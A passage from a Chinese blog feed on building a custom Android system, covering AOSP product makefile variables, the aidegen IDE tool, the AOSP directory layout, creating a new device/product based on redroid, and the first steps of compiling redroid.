</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="c"># _product_list_vars
</span></span></span><span class="line"><span class="cl"><span class="c"></span>
</span></span><span class="line"><span class="cl"><span class="c"># aapt (Android 资源打包工具) 配置 参考 https://developer.android.com/tools/aapt2?hl=zh-cn
</span></span></span><span class="line"><span class="cl"><span class="c"># 例如 := normal ldpi
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_LOCALES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_AAPT_CONFIG</span>
</span></span><span class="line"><span class="cl"><span class="c"># aapt 预编译的dpi
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_AAPT_PREBUILT_DPI</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 产品自带的各种packages name
</span></span></span><span class="line"><span class="cl"><span class="c"># PRODUCT_PACKAGES := my_module
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_HOST_PACKAGES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_PACKAGES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_PACKAGES_DEBUG</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_PACKAGES_DEBUG_ASAN</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_PACKAGES_DEBUG_JAVA_COVERAGE</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_PACKAGES_ENG</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_PACKAGES_TESTS</span>
</span></span><span class="line"><span class="cl"><span class="c"># overlays层 覆盖package文件
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_PACKAGE_OVERLAYS</span>
</span></span><span class="line"><span class="cl"><span class="err">DEVICE_PACKAGE_OVERLAYS</span>
</span></span><span class="line"><span class="cl"><span class="c"># 覆盖包名
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_MANIFEST_PACKAGE_NAME_OVERRIDES</span>
</span></span><span class="line"><span class="cl"><span class="c"># 强制指定包名 (默认是模块名)
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_PACKAGE_NAME_OVERRIDES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_CERTIFICATE_OVERRIDES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># properties文件设置
</span></span></span><span class="line"><span class="cl"><span class="c"># 例如PRODUCT_SYSTEM_PROPERTIES += ro.bluebird = 0
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_SYSTEM_PROPERTIES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_SYSTEM_EXT_PROPERTIES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_VENDOR_PROPERTIES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_ODM_PROPERTIES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_PRODUCT_PROPERTIES</span>
</span></span><span class="line"><span class="cl"><span class="c"># 类似上面 但是弃用了
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_SYSTEM_DEFAULT_PROPERTIES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 覆盖之前的写入
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_PROPERTY_OVERRIDES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_DEFAULT_PROPERTY_OVERRIDES</span>
</span></span><span class="line"><span class="cl"><span class="c"># 删除之前的写入
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_SYSTEM_PROPERTY_BLACKLIST</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_VENDOR_PROPERTY_BLACKLIST</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 复制文件到系统里 
</span></span></span><span class="line"><span class="cl"><span class="c"># 例子 PRODUCT_COPY_FILES += $(LOCAL_PATH)/test.sh:system/bin/test.sh
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_COPY_FILES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># OTA密钥
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_OTA_PUBLIC_KEYS</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_EXTRA_OTA_KEYS</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_EXTRA_RECOVERY_KEYS</span>
</span></span><span class="line"><span class="cl"><span class="c"># 主线分区开发证书
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_MAINLINE_SEPOLICY_DEV_CERTIFICATES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 资源替换选项
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_ENFORCE_RRO_EXCLUDED_OVERLAYS</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_ENFORCE_RRO_TARGETS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># sdk设置
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_SDK_ATREE_FILES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_SDK_ADDON_NAME</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_SDK_ADDON_COPY_FILES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_SDK_ADDON_COPY_MODULES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_SDK_ADDON_DOC_MODULES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_SDK_ADDON_SYS_IMG_SOURCE_PROP</span>
</span></span><span class="line"><span class="cl"><span class="c"># 默认wifi
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_DEFAULT_WIFI_CHANNELS</span>
</span></span><span class="line"><span class="cl"><span class="c"># sonng空间空间
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_SOONG_NAMESPACES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 限制访问供应商文件
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_RESTRICT_VENDOR_FILES</span>
</span></span><span class="line"><span class="cl"><span class="err">VENDOR_PRODUCT_RESTRICT_VENDOR_FILES</span>
</span></span><span class="line"><span class="cl"><span class="c"># 上述的例外
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">VENDOR_EXCEPTION_MODULES</span>
</span></span><span class="line"><span class="cl"><span class="err">VENDOR_EXCEPTION_PATHS</span>
</span></span><span class="line"><span class="cl"><span class="c"># 供应商内核头文件
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_VENDOR_KERNEL_HEADERS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># boot jar列表
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_BOOT_JARS</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_BOOT_JARS_EXTRA</span>
</span></span><span class="line"><span class="cl"><span class="c"># apex格式的
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_APEX_BOOT_JARS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 系统服务设置 
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_SYSTEM_SERVER_APPS</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_SYSTEM_SERVER_JARS</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_STANDALONE_SYSTEM_SERVER_JARS</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_SYSTEM_SERVER_JARS_EXTRA</span>
</span></span><span class="line"><span class="cl"><span class="c">#apex格式的
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_APEX_SYSTEM_SERVER_JARS</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_APEX_STANDALONE_SYSTEM_SERVER_JARS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># dex优化设置
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_DEXPREOPT_SPEED_APPS</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_DEX_PREOPT_MODULE_CONFIGS</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_DEX_PREOPT_DEFAULT_FLAGS</span>
</span></span><span class="line"><span class="cl"><span class="c"># dex 优化boot选项
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_DEX_PREOPT_BOOT_IMAGE_PROFILE_LOCATION</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#  库编译验证选项
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_BROKEN_VERIFY_USES_LIBRARIES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 编译时使用的代码污点库 参考 https://source.android.com/docs/security/test/sanitizers?hl=zh-cn
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_SANITIZER_MODULE_CONFIGS</span>
</span></span><span class="line"><span class="cl"><span class="c"># 例外情况
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_INTEGER_OVERFLOW_EXCLUDE_PATHS</span>
</span></span><span class="line"><span class="cl"><span class="c"># CFI选项 参考 https://source.android.com/docs/security/test/cfi?hl=zh-cn
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_CFI_INCLUDE_PATHS</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_CFI_EXCLUDE_PATHS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 需要预编译的系统apk文件
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_ALWAYS_PREOPT_EXTRACTED_APK</span>
</span></span><span class="line"><span class="cl"><span class="c"># 特权模块加载
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_LOADED_BY_PRIVILEGED_MODULES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># vndk选项
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_EXTRA_VNDK_VERSIONS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">#  系统证书白名单
</span></span></span><span class="line"><span class="cl"><span class="c"># 都与sing_var变量是否开启有关
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_ARTIFACT_SYSTEM_CERTIFICATE_REQUIREMENT_ALLOW_LIST</span>
</span></span><span class="line"><span class="cl"><span class="c"># 路径白名单
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_ARTIFACT_PATH_REQUIREMENT_HINT</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_ARTIFACT_PATH_REQUIREMENT_ALLOWED_LIST</span>
</span></span><span class="line"><span class="cl"><span class="c"># 强制放入系统分区
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_FORCE_PRODUCT_MODULES_TO_SYSTEM_PARTITION</span>
</span></span><span class="line"><span class="cl"><span class="c"># 强制vintf分区
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_OTA_ENFORCE_VINTF_KERNEL_REQUIREMENTS</span>
</span></span><span class="line"><span class="cl"><span class="c"># tag列表 被bp文件使用
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_INCLUDE_TAGS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 初始化分区的lib白名单
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_INTER_PARTITION_JAVA_LIBRARY_ALLOWLIST</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>虽然设置很多, 但是常用的不多 主要就</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="c"># 修改prop的 
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_SYSTEM_PROPERTIES</span>
</span></span><span class="line"><span class="cl"><span class="err">PRODUCT_PROPERTY_OVERRIDES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 添加自己的包
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_PACKAGES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># 添加系统服务
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="err">PRODUCT_SYSTEM_SERVER_APPS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>当然可以设置的自定义选项远不止这些  例如 <code>TARGET_VENDOR_PROP</code> 来设置prop文件,  这些就是由其他<code>core/*.mk</code>文件添加的非产品级的设置了</p>
]]></content></item><item><title>从零开始自定义安卓系统(3) 配置开发环境与新建product</title><link>https://blue-bird1.github.io/posts/aosp-3/</link><pubDate>Sun, 28 Jan 2024 02:26:53 +0800</pubDate><guid>https://blue-bird1.github.io/posts/aosp-3/</guid><description>从零开始自定义安卓系统(3) 配置开发环境与新建product aidegen aidegen是一个自动生成项目配置文件的工具 在运行完lunch后 会自动配置这</description><content type="html"><![CDATA[<h2 id="从零开始自定义安卓系统3-配置开发环境与新建product">从零开始自定义安卓系统(3) 配置开发环境与新建product</h2>
<h3 id="aidegen">aidegen</h3>
<p><code>aidegen</code>是一个自动生成项目配置文件的工具 在运行完<code>lunch</code>后 会自动配置这个工具路径</p>
<p>主要参数有    <a href="https://android.googlesource.com/platform/tools/asuite/+/refs/heads/main/aidegen/README.md">完整文档参考</a></p>
<ul>
<li>
<p><code>-s</code>  跳过构建</p>
</li>
<li>
<p><code>-n </code> 不自动运行<code>IDE</code></p>
</li>
<li>
<p><code>-i</code>   选择<code>IDE</code>类型</p>
</li>
<li>
<p><code>-p</code> 指定<code>IDE</code>路径</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 用vscode编辑整个项目 v是vscdoe c=clion a=android stuido i=idea</span>
</span></span><span class="line"><span class="cl">aidegen -i v -s .
</span></span><span class="line"><span class="cl"><span class="c1"># 编辑单个项目  检测后是打开android studio</span>
</span></span><span class="line"><span class="cl">aidegen packages/apps/Settings
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="目录结构">目录结构</h3>
<p>AOSP目录结构非常复杂 由非常多项目构成,但是大部分并不需要修改</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">- art 
</span></span><span class="line"><span class="cl">- Dalvik
</span></span><span class="line"><span class="cl">app运行时, 执行dex文件, 系统修改通常可以无视, 客户端岗位八股文经典题目
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">- bootable
</span></span><span class="line"><span class="cl">硬件boot层 如fastboot 如果不做硬件开发可以直接无视
</span></span><span class="line"><span class="cl">- bionic 
</span></span><span class="line"><span class="cl">实现libc这种底层库, 通常不需要改动
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">- cts
</span></span><span class="line"><span class="cl">- platform_testing
</span></span><span class="line"><span class="cl">兼容性和平台测试相关 自己玩玩可以无视
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">- developers 
</span></span><span class="line"><span class="cl">提供一些例子代码
</span></span><span class="line"><span class="cl">- development 
</span></span><span class="line"><span class="cl">一些开发与例子代码
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">- external  
</span></span><span class="line"><span class="cl">- prebuilt 
</span></span><span class="line"><span class="cl">都是存放的外部代码 开发不需要看
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-libcore
</span></span><span class="line"><span class="cl">-libnativehelper
</span></span><span class="line"><span class="cl">只需要用
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">- build
</span></span><span class="line"><span class="cl">- toolchain
</span></span><span class="line"><span class="cl">- tools
</span></span><span class="line"><span class="cl">编译用
</span></span></code></pre></td></tr></table>
</div>
</div><p>需要主要关注的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># rom修改
</span></span><span class="line"><span class="cl">/packages  自带的应用包
</span></span><span class="line"><span class="cl">/framework 安卓系统框架
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#  系统定制
</span></span><span class="line"><span class="cl">/vendor 厂商定制
</span></span><span class="line"><span class="cl">/device 厂商设备
</span></span><span class="line"><span class="cl">/hardware  硬件层
</span></span><span class="line"><span class="cl">/kernel 系统内核
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 如果对如何在AOSP 实现某个功能有疑问,如设置什么选项才能赋予root权限, 可能需要查阅代码编译流程
</span></span><span class="line"><span class="cl">/build
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="新建device和product">新建device和product</h3>
<p>在编译时已经知道 编译时需要选择编译目标.而编译目标在<code>AndroidProducts.mk</code> 这种文件下设置</p>
<p>参考<code>redroid</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nv">PRODUCT_MAKEFILES</span> <span class="o">:=</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="k">$(</span>LOCAL_DIR<span class="k">)</span>/redroid_x86_64.mk <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="k">$(</span>LOCAL_DIR<span class="k">)</span>/redroid_x86_64_only.mk <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="k">$(</span>LOCAL_DIR<span class="k">)</span>/redroid_arm64.mk <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    <span class="k">$(</span>LOCAL_DIR<span class="k">)</span>/redroid_arm64_only.mk <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>
</span></span><span class="line"><span class="cl"><span class="nv">COMMON_LUNCH_CHOICES</span> <span class="o">:=</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    redroid_x86_64-userdebug <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    redroid_x86_64_only-userdebug <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    redroid_arm64-userdebug <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    redroid_arm64_only-userdebug <span class="se">\
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>可知要新建一个<code>device</code> 首先在device目录下创建一个子目录 例如 <code>device/bluebird</code></p>
<p>然后创建一个``AndroidProducts.mk<code> </code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="c"># 这两个是一一对应关系,如果文件同名  `bluebird_redroid_x86_64.mk` 可以省略前面
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="nf">bluebird_redroid_x86_64</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="nv">PRODUCT_MAKEFILES</span> <span class="o">:=</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    bluebird_x86_64:<span class="k">$(</span>LOCAL_DIR<span class="k">)</span>/bluebird.mk 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">COMMON_LUNCH_CHOICES</span> <span class="o">:=</span> <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>    bluebird_x86_64-userdebug 
</span></span><span class="line"><span class="cl">    
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后新建一个<code>bluebird.mk </code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 直接复制redroid的配置
</span></span><span class="line"><span class="cl">$(call inherit-product, $(LOCAL_PATH)/../redroid/redroid_x86_64_only.mk)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># 定义自己产品的名字
</span></span><span class="line"><span class="cl">PRODUCT_NAME := bluebird_x86_64_only
</span></span><span class="line"><span class="cl">PRODUCT_DEVICE := bluebird_x86_64_only
</span></span><span class="line"><span class="cl">PRODUCT_BRAND := blulebird
</span></span><span class="line"><span class="cl">PRODUCT_MODEL := bluebird_x86_64_only
</span></span></code></pre></td></tr></table>
</div>
</div><p>再新建一个 <code>bluebird_x86_64_only/BoardConfig.mk</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 直接导入redroid的对应配置
</span></span><span class="line"><span class="cl">include device/redroid/redroid_x86_64_only/BoardConfig.mk
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后结果</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">○ → tree device/bluebird/
</span></span><span class="line"><span class="cl">device/bluebird/
</span></span><span class="line"><span class="cl">|-- AndroidProducts.mk
</span></span><span class="line"><span class="cl">|-- README.md
</span></span><span class="line"><span class="cl">|-- bluebird.mk
</span></span><span class="line"><span class="cl">`-- bluebird_x86_64_only
</span></span><span class="line"><span class="cl">    `-- BoardConfig.mk
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后就能进行 <code>lunch bluebird_x86_64_only-userdebug</code></p>
]]></content></item><item><title>从零开始自定义安卓系统(2) 编译redroid</title><link>https://blue-bird1.github.io/posts/aosp-2/</link><pubDate>Tue, 23 Jan 2024 18:11:54 +0800</pubDate><guid>https://blue-bird1.github.io/posts/aosp-2/</guid><description>从零开始自定义安卓系统(2) 编译redroid 添加redroid补丁 redroid添加了自己的补丁 1 2 3 # apply redroid patches git clone https://github.com/remote-android/redroid-patches.git ~/redroid-patches ~/redroid-patches/apply-patch.sh . 具体补丁内容可以</description><content type="html"><![CDATA[<h2 id="从零开始自定义安卓系统2-编译redroid">从零开始自定义安卓系统(2) 编译redroid</h2>
<h3 id="添加redroid补丁">添加redroid补丁</h3>
<p><code>redroid</code>添加了自己的补丁</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># apply redroid patches</span>
</span></span><span class="line"><span class="cl">git clone https://github.com/remote-android/redroid-patches.git ~/redroid-patches
</span></span><span class="line"><span class="cl">~/redroid-patches/apply-patch.sh . 
</span></span></code></pre></td></tr></table>
</div>
</div><p>具体补丁内容可以查看 <a href="https://github.com/remote-android/redroid-patches">仓库</a> 对应文件夹</p>
<h3 id="准备编译">准备编译</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> <span class="nb">source</span> build/envsetup.sh
</span></span><span class="line"><span class="cl"> lunch redroid_x86_64_only-userdebug
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个<code>envsetup.sh</code>文件里添加了很多辅助函数 可以使用<code>hmm</code>查看. 最常用的几个</p>
<ul>
